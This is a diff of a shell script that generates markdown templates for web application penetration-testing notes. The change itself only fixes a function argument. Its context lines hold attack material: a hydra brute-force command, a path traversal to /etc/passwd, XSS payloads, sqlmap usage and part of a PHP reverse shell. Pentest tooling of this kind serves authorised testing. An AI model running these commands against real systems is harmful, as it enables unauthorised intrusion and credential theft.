 
@@ -2372,7 +2393,7 @@ _create_webapp_files() {
 - [ ] What security controls are in place?
 - [ ] Is there WAF protection?
 - [ ] What about rate limiting?
-- [ ] Are there monitoring systems?" failed_ref
+- [ ] Are there monitoring systems?" "$failed_var"
 
     _create_file "01-Admin/4-Clean-Up.md" "# Clean-Up
 
@@ -2394,7 +2415,7 @@ _create_webapp_files() {
 - [ ] Export application logs
 - [ ] Save screenshot evidence
 - [ ] Archive request/response data
-- [ ] Document security findings" failed_ref
+- [ ] Document security findings" "$failed_var"
 
     _create_file "01-Admin/5-TODO.md" "# TODO
 
@@ -2442,7 +2463,7 @@ _create_webapp_files() {
 - [ ] File type validation
 - [ ] File size limits
 - [ ] Malicious file upload
-- [ ] Path traversal" failed_ref
+- [ ] Path traversal" "$failed_var"
 
     # Create 02-Data files
     _create_file "02-Data/1-Application URLs.md" "# Application URLs
@@ -2476,7 +2497,7 @@ _create_webapp_files() {
 - **REST APIs:** 
 - **GraphQL:** 
 - **SOAP:** 
-- **WebSocket:** " failed_ref
+- **WebSocket:** " "$failed_var"
 
     _create_file "02-Data/2-Parameters.md" "# Parameters
 
@@ -2516,7 +2537,7 @@ _create_webapp_files() {
 ### Command Injection
 - **OS command injection:** 
 - **Code injection:** 
-- **Template injection:** " failed_ref
+- **Template injection:** " "$failed_var"
 
     _create_file "02-Data/3-Technology Stack.md" "# Technology Stack
 
@@ -2563,7 +2584,7 @@ X-AspNet-Version:
 - 
 
 ### Default Files
-- " failed_ref
+- " "$failed_var"
 
     # Create evidence structure for web app testing
     _create_file "03-Evidence/1-Notes/1-Reconnaissance/1-Information Gathering.md" "# Information Gathering
@@ -2604,7 +2625,7 @@ dirb https://target.com /usr/share/wordlists/dirb/common.txt
 - 
 
 ### Sitemap.xml Analysis
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-Authentication/1-Login Testing.md" "# Login Testing
 
@@ -2643,7 +2664,7 @@ hydra -L users.txt -P passwords.txt target.com https-post-form "/login:username=
 ### Results
 - **Valid credentials:** 
 - **Bypass successful:** 
-- **Account lockouts:** " failed_ref
+- **Account lockouts:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-Authorization/1-Access Control.md" "# Access Control
 
@@ -2680,7 +2701,7 @@ GET /download?file=user123.pdf -> GET /download?file=../../../etc/passwd
 ### Results
 - **Access control issues:** 
 - **Data accessed:** 
-- **Functions compromised:** " failed_ref
+- **Functions compromised:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/4-Input Validation/1-SQL Injection.md" "# SQL Injection
 
@@ -2730,7 +2751,7 @@ sqlmap -r request.txt --dbs
 - **Databases:** 
 - **Tables:** 
 - **Sensitive data:** 
-- **Credentials:** " failed_ref
+- **Credentials:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/4-Input Validation/2-Cross-Site Scripting.md" "# Cross-Site Scripting
 
@@ -2790,7 +2811,7 @@ document.write('<img src=x onerror=alert("XSS")>');
 ### Mitigation Bypass
 - **Input filters:** 
 - **Output encoding:** 
-- **CSP bypass:** " failed_ref
+- **CSP bypass:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/5-Session Management/1-Session Analysis.md" "# Session Analysis
 
@@ -2834,7 +2855,7 @@ document.write('<img src=x onerror=alert("XSS")>');
 ### Concurrent Sessions
 - **Multiple logins allowed:** 
 - **Session termination:** 
-- **Device management:** " failed_ref
+- **Device management:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/6-File Upload/1-Upload Testing.md" "# Upload Testing
 
@@ -2891,7 +2912,7 @@ $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
 ### File Inclusion
 - **Local file inclusion:** 
 - **Remote file inclusion:** 
-- **Log poisoning:** " failed_ref
+- **Log poisoning:** " "$failed_var"
 }
 
 # Function to create assessment README
